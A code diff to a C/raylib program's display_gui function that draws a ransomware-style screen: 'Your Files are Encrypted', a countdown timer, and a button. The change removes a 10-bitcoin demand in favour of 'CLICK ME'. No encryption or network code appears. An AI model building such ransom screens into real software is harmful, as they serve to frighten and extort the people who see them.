@@ -33,7 +33,6 @@ int display_gui(time_t start_time) {
             frame_delay = 0;
         }
 
-        // time(NULL) is system wall clock — unaffected by raylib
         int elapsed = (int)(time(NULL) - start_time);
         int remaining = timer_seconds - elapsed;
         if (remaining < 0) remaining = 0;
@@ -46,11 +45,11 @@ int display_gui(time_t start_time) {
             ClearBackground((Color){ 255, 0, 0, 255 });
             DrawTexture(texture, 10, 10, WHITE);
             DrawText("Your Files are Encrypted, if you want", 10, texture.height + 20, 20, BLACK);
-            DrawText("them back you must send 10 bicoins to me", 10, texture.height + 45, 20, BLACK);
+            DrawText("them back you must click on the button", 10, texture.height + 45, 20, BLACK);
             DrawText("Time remaining:", 10, texture.height + 75, 20, BLACK);
             DrawText(timer_text, 200, texture.height + 75, 20,
                      remaining <= 10 ? RED : BLACK);
-            if (!button_clicked && GuiButton((Rectangle){ 10, texture.height + 105, 400, 70 }, "Send 10 bitcoins")) {
+            if (!button_clicked && GuiButton((Rectangle){ 10, texture.height + 105, 400, 70 }, "CLICK ME")) {
                 button_clicked = true;
                 watcher_on = false;
                 clear_queue(&queue);
